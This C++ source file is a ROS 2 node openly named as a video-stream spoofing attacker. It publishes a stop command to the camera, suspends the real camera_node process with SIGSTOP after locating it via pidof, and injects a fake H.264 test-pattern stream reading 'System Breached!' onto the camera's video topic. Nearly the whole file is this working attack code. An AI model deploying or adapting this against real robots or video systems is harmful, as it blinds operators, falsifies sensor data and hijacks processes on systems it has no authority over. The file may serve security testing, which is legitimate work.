#include <memory>
#include <thread>
#include <iostream>
#include <chrono>
#include <stdio.h>
#include <stdlib.h>
#include <algorithm>
#include <string>
#include <cctype>
#include <arpa/inet.h>

#include <sys/types.h>
#include <signal.h>

#include <gst/gst.h>
#include <gst/gstbus.h>
#include <gst/gstpipeline.h>
#include <gst/gstelement.h>
#include <gst/gstcaps.h>
#include <gst/app/gstappsink.h>

#include <nlohmann/json.hpp>


#include "rclcpp/rclcpp.hpp"
#include "rcl_interfaces/msg/parameter_descriptor.hpp"
#include <sensor_msgs/msg/compressed_image.hpp>
#include <sensor_msgs/msg/image.hpp>
#include "std_msgs/msg/string.hpp"

using std::placeholders::_1;

using namespace std::chrono_literals;
#define LEN 10
class VideoSpoofingNode : public rclcpp::Node
{
public:
  VideoSpoofingNode()
  : Node("video_stream_spoofing_attacker"),
    pipeline_(nullptr), source_(nullptr), sink_(nullptr),
    bus_(nullptr), loop_(nullptr)
  {
    const std::string ns = std::string(this->get_namespace());
    publisher_ = this->create_publisher<sensor_msgs::msg::CompressedImage>(
      ns + "/camera/color/video",
      rclcpp::SensorDataQoS());

    publisher_cmd_ = this->create_publisher<std_msgs::msg::String>(
      ns + "/videostreamcmd",
      rclcpp::SensorDataQoS());

    on_set_parameter_cb_handle_ =
      this->add_on_set_parameters_callback(
      std::bind(
        &VideoSpoofingNode::on_set_parameter_cb, this,
        _1));
    killCameraNode();
    gst_init(nullptr, nullptr);
    initializeGst();


    std_msgs::msg::String msg;
    RCLCPP_INFO(this->get_logger(), "Sending start stream command");
    msg.data = "{ \"Command\": \"start\" }";
    publisher_cmd_->publish(msg);
    RCLCPP_INFO(this->get_logger(), "Sent start stream command, waiting 3 seconds");

  }

  ~VideoSpoofingNode()
  {
    //killCameraNode();
    gst_element_set_state(pipeline_, GST_STATE_NULL);
    gst_object_unref(pipeline_);
    gst_object_unref(bus_);
    g_main_loop_unref(loop_);
    long pid = getPidCameraNode();
    RCLCPP_INFO(this->get_logger(), "Killing camera node with pid %ld", pid);
    sendSignal(pid, 18);
    sendSignal(pid, 2);

  }

  long getPidCameraNode()
  {
    char line[LEN];
    FILE * cmd = popen("pidof -s camera_node", "r");
    long pid = 0;
    fgets(line, LEN, cmd);
    pid = strtoul(line, NULL, 10);
    return pid;
  }


  int sendSignal(const int & pid, const int & sig)
  {
    int res = kill(pid, sig);
    std::string signalDescription = "";
    switch (sig) {
      case 2:
        signalDescription = "SIGINT";
        break;
      case 18:
        signalDescription = "SIGCONT";
        break;
      case 19:
        signalDescription = "SIGSTOP";
        break;
      default:
        signalDescription = "UNKNOWN";
        break;
    }
    if (res == 0) {
      RCLCPP_INFO(this->get_logger(), "Sent signal [%d] %s to pid %d", sig, signalDescription.c_str(), pid);
    } else {
      RCLCPP_INFO(this->get_logger(), "Failed to send signal [%d] %s to pid %d", sig, signalDescription.c_str(), pid);
    }
    return res;
  }

  void killCameraNode()
  {
    RCLCPP_INFO(this->get_logger(), "Sending stop stream command");
    std_msgs::msg::String msg;
    msg.data = "{ \"Command\": \"stop\" }";
    publisher_cmd_->publish(msg);

    RCLCPP_INFO(this->get_logger(), "Sent stop stream command, waiting 3 seconds");
    std::this_thread::sleep_for(std::chrono::seconds(3));
    long pid = getPidCameraNode();
    RCLCPP_INFO(this->get_logger(), "Stopping camera node with pid %ld", pid);
    sendSignal(pid, 19);
  }

private:
  bool initializeGst()
  {
    RCLCPP_INFO(this->get_logger(), "Initializing Gst");
    GError * err = NULL;


    const std::string gst_launch =
      "videotestsrc pattern=smpte is-live=true ! video/x-raw,format=I420,width=1280,height=720,framerate=25/1 \
                ! textoverlay text=\"System Breached!\" valignment=4 halignment=1 font-desc=Sans \
                ! videoconvert ! x264enc ! video/x-h264, stream-format=byte-stream,profile=main \
                ! queue ! appsink name=mysink \
                ";

    pipeline_ = gst_parse_launch(gst_launch.c_str(), &err);

    if (err != NULL) {
      RCLCPP_ERROR(this->get_logger(), "failed to create pipeline : (%s)", err->message);
      g_error_free(err);
      return false;
    }

    GstPipeline * pipeline = GST_PIPELINE(pipeline_);

    bus_ = gst_pipeline_get_bus(pipeline);

    if (!bus_) {
      RCLCPP_ERROR(this->get_logger(), "failed to retrieve GstBus from pipeline");
      return false;
    }

    // Get the appsrc
    GstElement * appsinkElement = gst_bin_get_by_name(GST_BIN(pipeline), "mysink");
    GstAppSink * appsink = GST_APP_SINK(appsinkElement);

    if (!appsink) {
      RCLCPP_ERROR(this->get_logger(), "failed to retrieve AppSink element from pipeline");
      return false;
    }

    sink_ = appsink;

    GstAppSinkCallbacks cb;
    memset(&cb, 0, sizeof(GstAppSinkCallbacks));

    cb.eos = on_eos;
    cb.new_preroll = on_preroll;
    cb.new_sample = on_buffer;

    gst_app_sink_set_callbacks(sink_, &cb, (void *)this, NULL);

    const GstStateChangeReturn result = gst_element_set_state(pipeline_, GST_STATE_PLAYING);

    if (result == GST_STATE_CHANGE_ASYNC) {
      // here will be a debug point in the future
      RCLCPP_INFO(get_logger(), "success to set pipeline state to PLAYING");
    } else if (result != GST_STATE_CHANGE_SUCCESS) {
      RCLCPP_ERROR(get_logger(), "failed to set pipeline state to PLAYING (error %u)", result);
      return false;
    }
    return true;
  }
  static void on_eos(_GstAppSink * sink, void * user_data)
  {
    VideoSpoofingNode * node = (VideoSpoofingNode *)user_data;
    (void)sink;
    RCLCPP_INFO(node->get_logger(), "on_eos called");
  }

  static GstFlowReturn on_preroll(_GstAppSink * sink, void * user_data)
  {
    VideoSpoofingNode * node = (VideoSpoofingNode *)user_data;
    (void)sink;
    RCLCPP_INFO(node->get_logger(), "on_preroll called");
    return GST_FLOW_OK;
  }

  static GstFlowReturn on_buffer(_GstAppSink * sink, void * user_data)
  {
    VideoSpoofingNode * node = (VideoSpoofingNode *)user_data;
    GstSample * sample;

    //RCLCPP_INFO(node->get_logger(), "on_buffer called");

    // Retrieve the buffer
    g_signal_emit_by_name(sink, "pull-sample", &sample);

    if (sample) {
      GstMapInfo info;
      GstBuffer * buffer = gst_sample_get_buffer(sample);

      gst_buffer_map(buffer, &info, GST_MAP_READ);

      if (info.data != NULL) {
        int width, height;
        GstStructure * str;

        GstCaps * caps = gst_sample_get_caps(sample);
        // Get a string containg the pixel format, width and height of the image
        str = gst_caps_get_structure(caps, 0);

        gst_structure_get_int(str, "width", &width);
        gst_structure_get_int(str, "height", &height);

        // ### publish
        auto img = std::make_unique<sensor_msgs::msg::Image>();
        GstClockTime stamp = buffer->pts;
        auto video_stream_chunk = std::make_unique<sensor_msgs::msg::CompressedImage>();
        video_stream_chunk->header.frame_id = "color_camera_frame";
        video_stream_chunk->header.stamp = rclcpp::Time(stamp, RCL_STEADY_TIME);

        // Get data from the info, and copy it to the chunk
        video_stream_chunk->data.resize(info.size);
        memcpy(video_stream_chunk->data.data(), info.data, info.size);


        static int count = 0;
        RCLCPP_INFO(
          node->get_logger(),
          "[#%4d], size %d,",
          count++, info.size);

        node->publisher_->publish(std::move(video_stream_chunk));
        gst_buffer_unmap(buffer, &info);
      }
      gst_sample_unref(sample);

      return GST_FLOW_OK;
    }

    return GST_FLOW_ERROR;
  }

  rcl_interfaces::msg::SetParametersResult
  on_set_parameter_cb(const std::vector<rclcpp::Parameter> & parameters)
  {

    rcl_interfaces::msg::SetParametersResult result;
    result.successful = true;
    for (const rclcpp::Parameter & parameter : parameters) {
      result.successful = false;
      result.reason = "the reason it could not be allowed";
      RCLCPP_INFO(this->get_logger(), "parameter: %s", parameter.get_name().c_str());
      RCLCPP_INFO(this->get_logger(), "value: %s", parameter);
    }
    return result;
  }
  //uint8_t data_;

  rclcpp::Publisher<sensor_msgs::msg::CompressedImage>::SharedPtr publisher_;
  rclcpp::Publisher<std_msgs::msg::String>::SharedPtr publisher_cmd_;

  std::string gst_pipeline_string_;
  OnSetParametersCallbackHandle::SharedPtr on_set_parameter_cb_handle_;

  GstElement * pipeline_;
  GstElement * source_;
  GstAppSink * sink_;
  GstBus * bus_;
  GMainLoop * loop_;

};

int main(int argc, char * argv[])
{
  rclcpp::init(argc, argv);
  rclcpp::executors::MultiThreadedExecutor executor;

  auto gst_node = std::make_shared<VideoSpoofingNode>();

  executor.add_node(gst_node);

  executor.spin();

  rclcpp::shutdown();
  return 0;
}
